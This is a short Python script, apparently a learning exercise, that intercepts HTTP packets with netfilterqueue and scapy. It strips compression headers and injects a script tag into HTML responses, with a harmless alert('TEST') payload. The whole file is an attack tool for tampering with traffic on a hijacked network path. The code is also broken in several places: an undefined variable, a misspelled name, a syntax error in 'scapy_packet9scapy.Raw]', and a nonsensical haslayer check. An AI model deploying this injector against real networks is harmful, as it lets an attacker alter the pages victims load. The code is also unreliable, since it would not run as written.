#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy
import re


'''

'''
def set_load(packet, load):
	packet[scapy.Raw].load = load

	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].len

	return packet


'''

'''
def process_packet(packet):
	
	scapy_packet = scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.Raw) == 80:

		load = scapy_packet[scapy.Raw].load
		
		if scapy_packet[scapy.TCP].dport == 80:			
			# Remove the encoding type in the load of the packet, and set change to a new packet. 
			print("[+] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			# print(scapy_packet.show())
		elif scapy_packet[scapy.TCP].sport == 80:
			print("[+] Response")
			# print(scapy_packet.show())
			injection_code = "<script>alert('TEST');</script>"
			load = load.replace("</body>", injection_code + "</body>") 
			
			# Look for a string with "Content-Length:\s" and capture both string and the number
			content_lenght_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load = load.replace(content_length, str(new_content_length))			

		if load != scapy_packet9scapy.Raw].load:	
			new_packet = set_load(scapy_packet, load)
			# Set the packet payload (data), in bytes.
			packet.set_payload(str(new_packet))
			
		packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
